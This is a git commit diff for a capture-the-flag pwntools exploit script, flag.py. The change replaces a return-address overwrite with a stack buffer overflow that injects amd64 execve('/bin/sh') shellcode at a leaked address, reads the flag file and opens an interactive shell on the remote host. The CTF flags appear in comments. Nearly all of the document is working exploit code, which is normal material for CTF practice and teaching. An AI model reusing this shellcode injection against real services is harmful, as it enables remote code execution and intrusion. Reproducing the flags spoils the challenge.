dce40a825b8f81b0fdfb930b6a95d718ff326ab4
yuan <ssspeed00@gmail.com>
2017-10-04 17:27:57 +0800

    CTF

--- shellcode/flag.py
+++ shellcode/flag.py
@@ -1,19 +1,18 @@
 #!/usr/bin/env python
 from pwn import *
 
-# AD{We1c0me_h4cker!_:P}
+# AD{NX_pr0t4ct10n_d1sab1e_1s_h4cker_fr1endly}
 
-context.arch = 'amd64'
-
-host , port = 'ctf.yuawn.idv.tw' , 10100
+host , port = 'ctf.yuawn.idv.tw' , 10103
 y = remote( host , port )
 
-p = flat(
-    'D' * 0x18,
-    0x40063a
-)
+y.recvuntil('0x')
+ad = int( y.recvline().strip() , 16 )
 
-y.sendline( p )
+sc = 'H1\xf6H1\xd2H\xb8/bin/sh\x00PH\x89\xe7j;X\x0f\x05'
 
+y.sendline( sc + 'D' * ( 0x78 - len( sc ) ) + p64( ad ) )
+
+y.sendline( 'cat /home/`whoami`/flag' )
 
 y.interactive()
